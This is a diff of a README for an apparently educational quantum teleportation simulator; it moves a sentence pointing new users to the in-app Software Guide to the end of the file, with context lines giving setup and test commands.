@@ -6,8 +6,6 @@
 
 **[Download Teleportation Lab for Windows ↓](https://github.com/Tapesh001/Quantum-Teleportation-and-Communication-./raw/refs/heads/main/downloads/Quantum_Teleportation_Animated.zip)** · [First experiment](#a-result-to-reproduce) · [Research paper](#from-the-paper-to-the-project) · [Code by project part](docs/code-map.md)
 
-For a guided first run, open **Theory → Software Guide** in the app. It covers launch, controls, sample messages, both fidelity scores, the noise graph, CSV files and history.
-
 ## Open the software
 
 1. Install Python 3.8 or newer and have a modern desktop browser available.
@@ -74,3 +72,5 @@ With independent 10% bit errors, increasing resource mixing from **0.20** to **0
 Run the checks with `python -m unittest discover -s tests -v`. To launch the optional Tk interface, use `python desktop/teleportation_model.py`. Desktop inputs, results and corrections follow the same model as the browser interface.
 
 The layout takes inspiration from the [reference workspace](https://github.com/SatyaSailesh/quantum-teleportation). The noise models and calculations are those of this quantum communication project.
+
+First visit? The app offers a **Software Guide** at the foot of the page. You can revisit it in **Theory**.
